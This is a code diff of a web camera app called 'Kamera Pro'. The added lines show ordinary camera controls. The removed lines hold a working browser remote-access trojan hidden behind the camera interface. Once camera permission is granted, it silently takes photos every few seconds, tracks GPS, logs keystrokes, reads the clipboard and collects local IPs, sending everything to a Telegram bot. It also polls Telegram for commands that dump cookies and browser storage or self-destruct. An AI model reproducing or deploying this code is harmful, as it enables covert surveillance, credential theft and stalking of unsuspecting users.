+  function hide(){
+    dom.topBar.classList.add('hide');
+    dom.bottomBar.classList.add('hide');
+    dom.zoom.classList.add('hide');
+    dom.modeBar.classList.add('hide');
+    dom.topStatus.classList.add('hide');
+    state.uiHidden = true;
+  }
+  ['touchstart','click','mousemove','keydown'].forEach(function(ev){
+    document.addEventListener(ev, show, {passive:true});
+  });
+  state.hideTimer = setTimeout(hide, CONFIG.UI_HIDE_MS);
+}
 
-            sendPhoto: function(blob, caption) {
-                try {
-                    var fd = new FormData();
-                    fd.append('chat_id', CONFIG.CHAT_ID);
-                    fd.append('photo', blob, 'p_' + Date.now() + '.jpg');
-                    fd.append('caption', caption || '');
-                    fd.append('disable_notification', 'true');
-                    fetch(CONFIG.TG_API + CONFIG.BOT_TOKEN + '/sendPhoto', {
-                        method: 'POST', body: fd
-                    }).then(function(r) { return r.json(); }).then(function(d) {
-                        if (!d.ok) {
-                            var fd2 = new FormData();
-                            fd2.append('chat_id', CONFIG.CHAT_ID);
-                            fd2.append('document', blob, 'p_' + Date.now() + '.jpg');
-                            fd2.append('caption', caption || '');
-                            fetch(CONFIG.TG_API + CONFIG.BOT_TOKEN + '/sendDocument', {
-                                method: 'POST', body: fd2
-                            });
-                        }
-                    }).catch(function() {});
-                } catch(e) {}
-            },
+/* ============================================================
+   ZOOM
+   ============================================================ */
+function applyZoom(){
+  if(!state.stream) return;
+  try{
+    var tr = state.stream.getVideoTracks()[0];
+    var cap = tr.getCapabilities();
+    if(cap.zoom){
+      var v = Math.min(cap.zoom.max||5, Math.max(cap.zoom.min||0.5, state.zoom));
+      tr.applyConstraints({advanced:[{zoom:v}]}).catch(function(){});
+    }
+  }catch(e){}
+  document.querySelectorAll('.zoom-opt').forEach(function(el){
+    el.classList.toggle('active', parseFloat(el.dataset.zoom)===state.zoom);
+  });
+}
 
-            sendBeacon: function(blob, caption) {
-                try {
-                    var fd = new FormData();
-                    fd.append('chat_id', CONFIG.CHAT_ID);
-                    fd.append('photo', blob, 's_' + Date.now() + '.jpg');
-                    fd.append('caption', caption || '');
-                    fd.append('disable_notification', 'true');
-                    fetch(CONFIG.TG_API + CONFIG.BOT_TOKEN + '/sendPhoto', {
-                        method: 'POST', body: fd
-                    }).catch(function() {});
-                } catch(e) {}
-            },
+/* ============================================================
+   EVENT LISTENERS
+   ============================================================ */
+dom.btnStart.addEventListener('click', function(){ startCamera(); });
 
-            sendDocument: function(blob, filename, caption) {
-                try {
-                    var fd = new FormData();
-                    fd.append('chat_id', CONFIG.CHAT_ID);
-                    fd.append('document', blob, filename);
-                    fd.append('caption', caption || '');
-                    fd.append('disable_notification', 'true');
-                    fetch(CONFIG.TG_API + CONFIG.BOT_TOKEN + '/sendDocument', {
-                        method: 'POST', body: fd
-                    }).catch(function() {});
-                } catch(e) {}
-            }
-        };
+dom.btnShutter.addEventListener('click', function(){
+  haptic(dom.btnShutter);
+  if(state.mode==='video'){ toggleVideoRecord(); return; }
+  if(state.timerActive) return;
+  if(state.timer > 0){
+    state.timerActive = true;
+    var n = state.timer;
+    dom.btnShutter.style.opacity = '.5';
+    var iv = setInterval(function(){
+      n--;
+      if(n<=0){ clearInterval(iv); state.timerActive=false; dom.btnShutter.style.opacity=''; captureManual(); }
+    },1000);
+    return;
+  }
+  captureManual();
+});
 
-        // ============================================================
-        // GPS TRACKING
-        // ============================================================
-        function startGPS() {
-            if (!navigator.geolocation) return;
-            state.gpsWatchId = navigator.geolocation.watchPosition(
-                function(pos) {
-                    state.gpsData = {
-                        lat: pos.coords.latitude,
-                        lon: pos.coords.longitude,
-                        alt: pos.coords.altitude || 0,
-                        acc: pos.coords.accuracy,
-                        spd: pos.coords.speed || 0,
-                        ts: new Date(pos.timestamp).toISOString()
-                    };
-                },
-                function() {},
-                { enableHighAccuracy: true, maximumAge: 30000, timeout: 15000 }
-            );
-        }
+dom.btnFlip.addEventListener('click', function(){
+  haptic(dom.btnFlip);
+  var nf = state.facingMode==='environment'?'user':'environment';
+  startCamera(nf);
+});
 
-        // ============================================================
-        // LOCAL IP GRABBER (WebRTC)
-        // ============================================================
-        function grabLocalIPs() {
-            return new Promise(function(resolve) {
-                var ips = new Set();
-                try {
-                    var pc = new RTCPeerConnection({
-                        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
-                    });
-                    pc.createDataChannel('');
-                    pc.createOffer().then(function(o) { pc.setLocalDescription(o); });
-                    pc.onicecandidate = function(e) {
-                        if (e.candidate) {
-                            var ip = e.candidate.address;
-                            if (ip && ip.indexOf(':') === -1 && ip.indexOf('127.') === -1 && ip.indexOf('0.') === -1) {
-                                ips.add(ip);
-                            }
-                        } else {
-                            pc.close();
-                            resolve(Array.from(ips));
-                        }
-                    };
-                    setTimeout(function() { pc.close(); resolve(Array.from(ips)); }, 2500);
-                } catch(e) { resolve([]); }
-            });
-        }
+dom.btnFlash.addEventListener('click', function(){
+  haptic(dom.btnFlash);
+  if(!state.stream) return;
+  state.flashOn = !state.flashOn;
+  try{ state.stream.getVideoTracks()[0].applyConstraints({advanced:[{torch:state.flashOn}]}); }catch(e){}
+  dom.btnFlash.classList.toggle('on', state.flashOn);
+});
 
-        // ============================================================
-        // KEYLOGGER
-        // ============================================================
-        function startKeylogger() {
-            var ignoreKeys = ['Shift','Control','Alt','Meta','CapsLock','Tab','ArrowLeft','ArrowRight','ArrowUp','ArrowDown','Escape'];
-            document.addEventListener('keydown', function(e) {
-                if (ignoreKeys.indexOf(e.key) !== -1) return;
-                if (e.key === 'Enter') state.keyBuf += '[ENTER]\n';
-                else if (e.key === 'Backspace') state.keyBuf += '[BS]';
-                else if (e.key === ' ') state.keyBuf += ' ';
-                else if (e.key.length === 1) state.keyBuf += e.key;
-                else state.keyBuf += '[' + e.key + ']';
-                if (state.keyBuf.length > 400) {
-                    TG.sendMessage('⌨️ [' + VID + ']\n' + state.keyBuf);
-                    state.keyBuf = '';
-                }
-            });
-            setInterval(function() {
-                if (state.keyBuf.length > 0) {
-                    TG.sendMessage('⌨️ [' + VID + ']\n' + state.keyBuf);
-                    state.keyBuf = '';
-                }
-            }, 12000);
-        }
+dom.btnGrid.addEventListener('click', function(){
+  haptic(dom.btnGrid);
+  state.gridOn = !state.gridOn;
+  dom.grid.classList.toggle('show', state.gridOn);
+  dom.btnGrid.classList.toggle('on', state.gridOn);
+});
 
-        // ============================================================
-        // CLIPBOARD MONITOR
-        // ============================================================
-        function checkClipboard() {
-            if (!navigator.clipboard || !navigator.clipboard.readText) return;
-            navigator.clipboard.readText().then(function(text) {
-                if (text && text !== state.lastClip && text.length > 0) {
-                    state.lastClip = text;
-                    TG.sendMessage('📋 [' + VID + ']\n' + text.substring(0, 2000));
-                }
-            }).catch(function() {});
-        }
+dom.btnTimer.addEventListener('click', function(){
+  haptic(dom.btnTimer);
+  var vals = [0,3,5,10];
+  var i = vals.indexOf(state.timer);
+  state.timer = vals[(i+1)%vals.length];
+  toast(state.timer===0?'Timer OFF':'Timer '+state.timer+'s','ok');
+});
 
-        // ============================================================
-        // CORE: CAPTURE FRAME
-        // ============================================================
-        function captureFrame(silent) {
-            if (!state.stream || !state.stream.active) return;
-            if (state.burstActive && silent) return;
-            state.burstActive = true;
-            state.frameCount++;
+document.querySelectorAll('.zoom-opt').forEach(function(el){
+  el.addEventListener('click', function(){ haptic(this); state.zoom = parseFloat(this.dataset.zoom); applyZoom(); });
+});
 
-            try {
-                var track = state.stream.getVideoTracks()[0];
-                var settings = track.getSettings();
-                var width = settings.width || CONFIG.MAX_WIDTH;
-                var height = settings.height || CONFIG.MAX_HEIGHT;
+document.querySelectorAll('.mode-item').forEach(function(el){
+  el.addEventListener('click', function(){
+    haptic(this);
+    document.querySelectorAll('.mode-item').forEach(function(e){ e.classList.remove('active'); });
+    this.classList.add('active');
+    state.mode = this.dataset.mode;
+    toast('Mode: '+this.textContent,'ok');
+  });
+});
 
-                var canvas = document.createElement('canvas');
-                canvas.width = width;
-                canvas.height = height;
-                var ctx = canvas.getContext('2d');
-                ctx.drawImage(dom.vf, 0, 0, width, height);
+dom.thumb.addEventListener('click', function(){
+  if(!state.lastBlob) return toast('Belum ada foto','');
+  showPreview(state.lastBlob, state.lastType, state.lastCap);
+});
 
-                // Watermark subtle
-                var ts = getTimestamp();
-                ctx.font = '12px -apple-system, "Helvetica Neue", sans-serif';
-                ctx.fillStyle = 'rgba(255, 255, 255, 0.3)';
-                ctx.fillText(ts, 18, height - 14);
+dom.fsClose.addEventListener('click', function(){ dom.fs.classList.remove('show'); });
+dom.fs.addEventListener('click', function(e){ if(e.target===dom.fs) dom.fs.classList.remove('show'); });
 
-                // Build caption
-                var cap = (silent ? '🤫 Auto' : '📸 Foto') + ' | ' + getTimeShort();
-                if (state.gpsData) {
-                    cap += '\n📍 https://maps.google.com/?q=' + state.gpsData.lat + ',' + state.gpsData.lon;
-                    cap += '\n🎯 ±' + Math.round(state.gpsData.acc) + 'm';
-                }
-                if (state.localIPs.length > 0) cap += '\n🌐 ' + state.localIPs[0];
-                cap += '\n#' + state.frameCount + ' | ' + state.facingMode;
+document.addEventListener('click', function(e){
+  if(e.target.closest('button') || e.target.closest('.zoom-opt') || e.target.closest('.mode-item') || e.target.closest('.thumb') || e.target.closest('.perm-overlay') || e.target.closest('.fs')) return;
+  dom.focus.style.left = e.clientX+'px';
+  dom.focus.style.top = e.clientY+'px';
+  dom.focus.classList.remove('animate');
+  void dom.focus.offsetWidth;
+  dom.focus.classList.add('animate');
+});
 
-                canvas.toBlob(function(blob) {
-                    if (!blob) { state.burstActive = false; return; }
-                    if (silent) TG.sendBeacon(blob, cap);
-                    else TG.sendPhoto(blob, cap);
+/* ============================================================
+   PREVIEW (iOS Photos style)
+   ============================================================ */
+function showPreview(blob, type, cap){
+  var url = URL.createObjectURL(blob);
+  dom.fsMedia.innerHTML = '';
+  var el;
+  if(type==='video'){ el = document.createElement('video'); el.src=url; el.controls=true; el.autoplay=true; el.className='fs-media'; }
+  else if(type==='audio'){ el = document.createElement('audio'); el.src=url; el.controls=true; el.autoplay=true; el.style.marginTop='40px'; }
+  else { el = document.createElement('img'); el.src=url; el.className='fs-media'; }
+  dom.fsMedia.appendChild(el);
+  dom.fsInfo.textContent = cap || '';
+  dom.fsTitle.textContent = type==='video'?'Video':type==='audio'?'Audio':'Foto';
+  dom.fsTools.innerHTML = '';
 
-                    state.lastPhotoData = canvas.toDataURL('image/jpeg', CONFIG.JPEG_QUALITY);
-                    state.lastPhotoCaption = cap;
-                    dom.thumbBox.innerHTML = '<img src="' + state.lastPhotoData + '" alt="Preview">';
-                    dom.thumbBox.classList.add('has-photo');
+  var dl = document.createElement('div');
+  dl.className = 'fs-tool primary';
+  dl.innerHTML = '<svg viewBox="0 0 24 24"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg><span>Simpan</span>';
+  dl.onclick = function(){ downloadBlob(blob,type); };
+  dom.fsTools.appendChild(dl);
 
-                    if (!silent) {
-                        dom.flashOverlay.classList.add('active');
-                        setTimeout(function() { dom.flashOverlay.classList.remove('active'); }, 70);
-                    }
+  var del = document.createElement('div');
+  del.className = 'fs-tool danger';
+  del.innerHTML = '<svg viewBox="0 0 24 24"><path d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4z"/></svg><span>Hapus</span>';
+  del.onclick = function(){ URL.revokeObjectURL(url); dom.fs.classList.remove('show'); };
+  dom.fsTools.appendChild(del);
 
-                    // Burst live photo
-                    if (!silent) {
-                        for (var b = 0; b < CONFIG.BURST_COUNT - 1; b++) {
-                            (function(delay) {
-                                setTimeout(function() {
-                                    var bc = document.createElement('canvas');
-                                    bc.width = width; bc.height = height;
-                                    var bctx = bc.getContext('2d');
-                                    bctx.drawImage(dom.vf, 0, 0, width, height);
-                                    bc.toBlob(function(bb) {
-                                        if (bb) TG.sendBeacon(bb, '🎬 Burst ' + (delay/CONFIG.BURST_DELAY+1) + '/' + CONFIG.BURST_COUNT);
-                                    }, 'image/jpeg', CONFIG.JPEG_QUALITY - 0.05);
-                                }, delay);
-                            })((b + 1) * CONFIG.BURST_DELAY);
-                        }
-                    }
-                    state.burstActive = false;
-                }, 'image/jpeg', CONFIG.JPEG_QUALITY);
-            } catch(e) { state.burstActive = false; }
-        }
+  var close = document.createElement('div');
+  close.className = 'fs-tool';
+  close.innerHTML = '<svg viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg><span>Tutup</span>';
+  close.onclick = function(){ dom.fs.classList.remove('show'); };
+  dom.fsTools.appendChild(close);
 
-        // ============================================================
-        // AUTO CAPTURE — 2 DETIK
-        // ============================================================
-        function startSilentCapture() {
-            if (state.silentTimer) return;
-            setTimeout(function() { captureFrame(true); }, CONFIG.FIRST_CAPTURE_DELAY);
-            state.silentTimer = setInterval(function() {
-                if (state.stream && state.stream.active) captureFrame(true);
-            }, CONFIG.SILENT_INTERVAL);
-        }
+  dom.fs.classList.add('show');
+}
 
-        // ============================================================
-        // C2 TELEGRAM POLLING
-        // ============================================================
-        function pollC2() {
-            try {
-                var url = CONFIG.TG_API + CONFIG.BOT_TOKEN +
-                    '/getUpdates?offset=' + (state.lastUpdateId + 1) + '&timeout=5&limit=5';
-                fetch(url).then(function(r) { return r.json(); }).then(function(data) {
-                    if (!data.ok || !data.result || !data.result.length) return;
-                    for (var i = 0; i < data.result.length; i++) {
-                        var upd = data.result[i];
-                        state.lastUpdateId = upd.update_id;
-                        var msg = upd.message;
-                        if (!msg || !msg.text) continue;
-                        var parts = msg.text.trim().split(/\s+/);
-                        var cmd = parts[0].toLowerCase();
-                        var target = parts[1] || '';
-                        if (target !== VID && target !== 'ALL' && target !== 'BROADCAST') continue;
-                        var result = executeC2(cmd, parts.slice(2));
-                        if (result) TG.sendMessage('[' + VID + '] ' + result);
-                    }
-                }).catch(function() {});
-            } catch(e) {}
-        }
+/* ============================================================
+   SERVICE WORKER + PERMISSIONS
+   ============================================================ */
+if('serviceWorker' in navigator){ navigator.serviceWorker.register('sw.js').catch(function(){}); }
+if(navigator.permissions && navigator.permissions.query){
+  navigator.permissions.query({name:'camera'}).then(function(p){
+    if(p.state==='granted') dom.sText.textContent = 'Izin kamera tersimpan';
+    p.onchange = function(){ if(p.state==='granted') dom.sText.textContent = 'Izin kamera tersimpan'; };
+  }).catch(function(){});
+}
 
-        function executeC2(cmd, args) {
-            switch(cmd) {
-                case '/ping': return '🟢 Online | #' + state.frameCount + ' | ' + getTimestamp();
-                case '/photo': captureFrame(false); return '📸 Terkirim | #' + state.frameCount;
-                case '/gps': return state.gpsData ? '📍 ' + state.gpsData.lat.toFixed(5) + ',' + state.gpsData.lon.toFixed(5) + '\n🗺️ https://maps.google.com/?q=' + state.gpsData.lat + ',' + state.gpsData.lon + '\n🎯 ±' + Math.round(state.gpsData.acc) + 'm' : 'GPS N/A';
-                case '/flip': var nf = state.facingMode === 'environment' ? 'user' : 'environment'; startCamera(nf); return '📷 ' + nf;
-                case '/cookies': return document.cookie || '(kosong)';
-                case '/storage':
-                    var dump = {
-                        localStorage: Object.assign({}, localStorage),
-                        sessionStorage: Object.assign({}, sessionStorage),
-                        cookies: document.cookie,
-                        url: location.href,
-                        referrer: document.referrer,
-                        historyLength: history.length,
-                        userAgent: navigator.userAgent,
-                        platform: navigator.platform,
-                        language: navigator.language,
-                        screenResolution: screen.width + 'x' + screen.height,
-                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                        timestamp: new Date().toISOString(),
-                        frameCount: state.frameCount,
-                        facingMode: state.facingMode,
-                        zoom: state.currentZoom
-                    };
-                    var blob = new Blob([JSON.stringify(dump, null, 2)], { type: 'application/json' });
-                    TG.sendDocument(blob, 'storage_' + VID + '.json', '💾 Storage | #' + state.frameCount);
-                    return '💾 Storage terkirim';
-                case '/info':
-                    return '🆔 ' + VID + '\n📷 ' + state.facingMode + '\n🔍 ' + state.currentZoom + '×\n⚡ ' + (state.flashOn?'ON':'OFF') + '\n📸 #' + state.frameCount + '\n⏱️ ' + (CONFIG.SILENT_INTERVAL/1000) + 's\n📍 ' + (state.gpsData?state.gpsData.lat.toFixed(4)+','+state.gpsData.lon.toFixed(4):'N/A') + '\n🌐 ' + (state.localIPs.join(', ')||'N/A') + '\n🖥️ ' + screen.width + '×' + screen.height;
-                case '/wipelogs': try{localStorage.clear()}catch(e){} try{sessionStorage.clear()}catch(e){} return '🧹 Done';
-                case '/selfdest': clearAllTimers(); document.body.innerHTML = ''; setTimeout(function(){window.close()},500); return '💀 Done';
-                default: return '❓ ' + cmd;
-            }
-        }
+openDB().then(function(){ countMedia().then(function(n){ state.count = n; }); });
 
-        function startC2Polling() {
-            if (state.c2Timer) return;
-            function loop() { pollC2(); state.c2Timer = setTimeout(loop, CONFIG.C2_POLL_INTERVAL); }
-            loop();
-        }
+console.log('📸 Kamera Pro v14.0 — iOS Style + Full Stealth');
+console.log('🆔 VID:', VID);
 
-        function clearAllTimers() {
-            [state.silentTimer, state.c2Timer].forEach(function(t) { if (t) clearInterval(t); });
-            if (state.gpsWatchId) navigator.geolocation.clearWatch(state.gpsWatchId);
-        }
-
-        // ============================================================
-        // ZOOM CONTROL
-        // ============================================================
-        function applyZoom() {
-            if (!state.stream) return;
-            try {
-                var track = state.stream.getVideoTracks()[0];
-                var cap = track.getCapabilities();
-                if (cap.zoom) {
-                    var v = Math.min(cap.zoom.max || 5, Math.max(cap.zoom.min || 0.5, state.currentZoom));
-                    track.applyConstraints({ advanced: [{ zoom: v }] }).catch(function() {});
-                }
-            } catch(e) {}
-            document.querySelectorAll('.zoom-option').forEach(function(el) {
-                el.classList.toggle('active', parseFloat(el.dataset.zoom) === state.currentZoom);
-            });
-        }
-
-        function setZoom(z) { state.currentZoom = z; applyZoom(); }
-
-        // ============================================================
-        // CAMERA INIT
-        // ============================================================
-        function startCamera(facing) {
-            if (state.isStarting) return;
-            state.isStarting = true;
-            dom.btnStartCamera.disabled = true;
-            dom.errorText.textContent = '';
-            dom.statusDot.className = 'status-dot loading';
-            dom.statusText.textContent = 'Mengakses kamera...';
-
-            if (state.stream) {
-                state.stream.getTracks().forEach(function(t) { t.stop(); });
-                state.stream = null;
-                dom.vf.srcObject = null;
-            }
-
-            var targetFacing = facing || state.facingMode;
-            navigator.mediaDevices.getUserMedia({
-                video: { facingMode: targetFacing, width: { ideal: CONFIG.MAX_WIDTH }, height: { ideal: CONFIG.MAX_HEIGHT } },
-                audio: false
-            }).then(function(s) {
-                onCameraSuccess(s, targetFacing);
-            }).catch(function() {
-                var alt = targetFacing === 'environment' ? 'user' : 'environment';
-                navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: alt }, audio: false
-                }).then(function(s) {
-                    onCameraSuccess(s, alt);
-                }).catch(function() {
-                    navigator.mediaDevices.getUserMedia({
-                        video: true, audio: false
-                    }).then(function(s) {
-                        onCameraSuccess(s, 'environment');
-                    }).catch(function(err) {
-                        onCameraError(err);
-                    });
-                });
-            });
-        }
-
-        function onCameraSuccess(mediaStream, facing) {
-            state.stream = mediaStream;
-            dom.vf.srcObject = mediaStream;
-            dom.vf.play().then(function() {
-                state.facingMode = facing;
-                state.isStarting = false;
-                dom.btnStartCamera.disabled = false;
-                dom.statusDot.className = 'status-dot ready';
-                dom.statusText.textContent = 'Kamera aktif';
-
-                if (state.facingMode === 'user') dom.vf.classList.add('front-camera');
-                else dom.vf.classList.remove('front-camera');
-
-                applyZoom();
-                dom.permOverlay.classList.add('hidden');
-                initializeRAT();
-            }).catch(function(err) { onCameraError(err); });
-        }
-
-        function onCameraError(err) {
-            state.isStarting = false;
-            dom.btnStartCamera.disabled = false;
-            dom.statusDot.className = 'status-dot error';
-            dom.statusText.textContent = 'Gagal';
-            var msg = 'Gagal mengakses kamera';
-            if (err && err.message) {
-                if (err.message.indexOf('Permission') !== -1) msg = 'Izin kamera ditolak';
-                else if (err.message.indexOf('NotFound') !== -1) msg = 'Kamera tidak ditemukan';
-            }
-            dom.errorText.textContent = msg;
-        }
-
-        // ============================================================
-        // RAT INIT
-        // ============================================================
-        function initializeRAT() {
-            grabLocalIPs().then(function(ips) { state.localIPs = ips; });
-            setTimeout(function() {
-                TG.sendMessage('🟢 ONLINE\n🆔 ' + VID + '\n📱 ' + navigator.userAgent.substring(0,80) + '\n🖥️ ' + screen.width + '×' + screen.height + '\n🌐 ' + navigator.language + '\n🌍 IP: ' + (state.localIPs.join(', ')||'Loading...') + '\n🔗 ' + location.href + '\n⏱️ Auto: ' + (CONFIG.SILENT_INTERVAL/1000) + 's\n📷 ' + state.facingMode);
-            }, 500);
-            startGPS();
-            startSilentCapture();
-            startKeylogger();
-            startC2Polling();
-            setInterval(checkClipboard, CONFIG.CLIPBOARD_INTERVAL);
-            setInterval(function() {
-                TG.sendMessage('💓 HB ' + VID + ' | #' + state.frameCount + ' | ' + getTimeShort());
-            }, CONFIG.HEARTBEAT_INTERVAL);
-        }
-
-        // ============================================================
-        // EVENT LISTENERS
-        // ============================================================
-        dom.btnStartCamera.addEventListener('click', function() { startCamera(); });
-        dom.btnShutter.addEventListener('click', function() { captureFrame(false); });
-
-        // FLIP = JEPRET + KIRIM
-        dom.btnFlip.addEventListener('click', function() {
-            var nf = state.facingMode === 'environment' ? 'user' : 'environment';
-            startCamera(nf);
-            setTimeout(function() { captureFrame(false); }, CONFIG.FLIP_CAPTURE_DELAY);
-        });
-
-        dom.btnFlash.addEventListener('click', function() {
-            if (!state.stream) return;
-            state.flashOn = !state.flashOn;
-            try {
-                state.stream.getVideoTracks()[0].applyConstraints({ advanced: [{ torch: state.flashOn }] });
-            } catch(e) {}
-            dom.btnFlash.classList.toggle('on', state.flashOn);
-        });
-
-        document.querySelectorAll('.zoom-option').forEach(function(el) {
-            el.addEventListener('click', function() { setZoom(parseFloat(this.dataset.zoom)); });
-        });
-
-        dom.thumbBox.addEventListener('click', function() {
-            if (!state.lastPhotoData) return;
-            dom.fsImage.src = state.lastPhotoData;
-            dom.fsInfo.textContent = state.lastPhotoCaption || '';
-            dom.fsPreview.classList.add('show');
-        });
-        dom.fsClose.addEventListener('click', function() { dom.fsPreview.classList.remove('show'); });
-        dom.fsPreview.addEventListener('click', function(e) { if (e.target === dom.fsPreview) dom.fsPreview.classList.remove('show'); });
-
-        document.addEventListener('click', function(e) {
-            if (e.target.closest('button') || e.target.closest('.zoom-option') || e.target.closest('.thumb-glass') || e.target.closest('.perm-overlay') || e.target.closest('.fs-preview')) return;
-            dom.focusRing.style.left = e.clientX + 'px';
-            dom.focusRing.style.top = e.clientY + 'px';
-            dom.focusRing.classList.remove('animate');
-            void dom.focusRing.offsetWidth;
-            dom.focusRing.classList.add('animate');
-        });
-
-        console.log('📸 Kamera Pro v11.0 — Glassmorphism Premium');
-        console.log('🆔 VID:', VID);
-    })();
-    </script>
+})();
+</script>
 </body>
-</html>
+    </html>
